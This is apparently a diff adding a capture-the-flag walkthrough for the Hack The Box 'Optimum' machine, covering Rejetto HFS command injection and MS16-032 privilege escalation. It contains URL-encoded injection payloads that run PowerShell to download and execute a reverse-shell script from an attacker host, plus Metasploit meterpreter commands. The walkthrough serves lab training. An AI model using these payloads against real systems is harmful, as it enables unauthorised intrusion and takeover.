@@ -1,0 +1,208 @@
+
+C:\Windows\System32  <- 64 bit binaries/libraries or C:\Windows\SysNative\
+C:\Windows\SysWow64  <- 32 bit binaries/libraries
+
+
+Now use this with burp to test with icmp:
+GET /?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\Powershell.exe ping 10.10.14.10} HTTP/1.1
+
+URL encoded:
+GET /?search=%00{.exec|c%3a\Windows\SysNative\WindowsPowershell\v1.0\Powershell.exe+ping+10.10.14.10.} HTTP/1.1
+
+
+
+Now to get a reverse tcp shell with burp:
+GET /?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\Powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1').} HTTP/1.1
+
+Now URL encode it:
+GET+/%3fsearch%3d%2500{.exec|c%3a\Windows\SysNative\WindowsPowershell\v1.0\Powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/Invoke-PowerShellTcp.ps1').}+HTTP/1.1
+
+
+Next, run systeminfo command, which provides infoon all hotfixes installed as well as OS version.
+
+Next use a script called sherlock to look for vulnerabilities,
+grep -i function Sherlock.ps1
+function Get-FileVersionInfo ($FilePath) {
+function Get-InstalledSoftware($SoftwareName) {
+function Get-Architecture {
+function Get-CPUCoreCount {
+function New-ExploitTable {
+function Set-ExploitTable ($MSBulletin, $VulnStatus) {
+function Get-Results {
+function Find-AllVulns {
+function Find-MS10015 {
+function Find-MS10092 {
+function Find-MS13053 {
+function Find-MS13081 {
+function Find-MS14058 {
+function Find-MS15051 {
+function Find-MS15078 {
+function Find-MS16016 {
+function Find-MS16032 {
+function Find-MS16034 {
+function Find-CVE20177199 {
+function Find-MS16135 {
+
+
+
+Edit script and a line at the bottom to find all vulns:
+Find-AllVulns
+
+
+Next on revershell window enter the following:
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10/Sherlock.ps1')
+
+PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10/Sherlock.ps1')
+
+
+Title      : User Mode to Ring (KiTrap0D)
+MSBulletin : MS10-015
+CVEID      : 2010-0232
+Link       : https://www.exploit-db.com/exploits/11199/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Task Scheduler .XML
+MSBulletin : MS10-092
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Not Vulnerable
+
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+MSBulletin : MS13-053
+CVEID      : 2013-1300
+Link       : https://www.exploit-db.com/exploits/33213/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenuEx Win32k NULL Page
+MSBulletin : MS13-081
+CVEID      : 2013-3881
+Link       : https://www.exploit-db.com/exploits/31576/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenu Win32k Null Pointer Dereference
+MSBulletin : MS14-058
+CVEID      : 2014-4113
+Link       : https://www.exploit-db.com/exploits/35101/
+VulnStatus : Not Vulnerable
+
+Title      : ClientCopyImage Win32k
+MSBulletin : MS15-051
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Not Vulnerable
+
+Title      : Font Driver Buffer Overflow
+MSBulletin : MS15-078
+CVEID      : 2015-2426, 2015-2433
+Link       : https://www.exploit-db.com/exploits/38222/
+VulnStatus : Not Vulnerable
+
+Title      : 'mrxdav.sys' WebDAV
+MSBulletin : MS16-016
+CVEID      : 2016-0051
+Link       : https://www.exploit-db.com/exploits/40085/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
+             6-034?
+VulnStatus : Appears Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+             ample-Exploits/MS16-135
+VulnStatus : Appears Vulnerable
+
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+             tml
+VulnStatus : Not Vulnerable
+
+###################
+Next, we look for one of the CVEs in this case MS16-032 and google MS16-032 powershell.
+Download the powershell script written by fuzzysecurity, however this needs modifciation since it already
+needs access to console window in this case use one already ready for use by powershell empire.
+
+cp /opt/powershell/Empire/data/module_source/privesc/Invoke-MS16032.ps1 .
+
+
+Copy the function name from the top:
+Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/shell.ps1')"
+
+Now copy:
+cp Invoke-PowerShellTcp.ps1 shell.ps1
+
+and edit the port number at the bottom of shell.ps1 to something different
+
+
+Run the follwoing on urrent revershell while opening a new netcat session:
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/Invoke-MS16032.ps1')
+
+
+Takes a while so wait a bit for shell and you will be system.
+
+
+
+###### THIS WAS ALL USING POWERSHELL ######
+
+
+
+
+##### NEXT IS USING METASPLOIT, while having burp on and manually forwarding request before timeout #####
+search rejetto
+use exploit/windows/http/rejetto_hfs_exec
+set rhost 10.10.10.8
+set srvhost 10.10.14.10
+set Proxies http:127.0.0.1:8080
+set srvport 8088
+set ReverseAllowProxy true
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost tun0
+run
+
+Next Search suggest:
+search suggest
+use post/multi/recon/local_exploit_suggester
+set session 1
+run
+
+use windows/local/ms16_032_secondary_logon_handle_privesc
+
+OUTPUT
+[*] 10.10.10.8 - Collecting local exploits for x86/windows...
+[*] 10.10.10.8 - 29 exploit checks are being tried...
+[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[*] Post module execution completed
+
+
+Next migrate into a 64 bit process for next portion regarding metasploit to work.
+ps
+meterpreter > migrate 1200
+[*] Migrating from 1588 to 1200...
+[*] Migration completed successfully.
+meterpreter > sysinfo
+Computer        : OPTIMUM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x64/windows
+
+
+
+
+
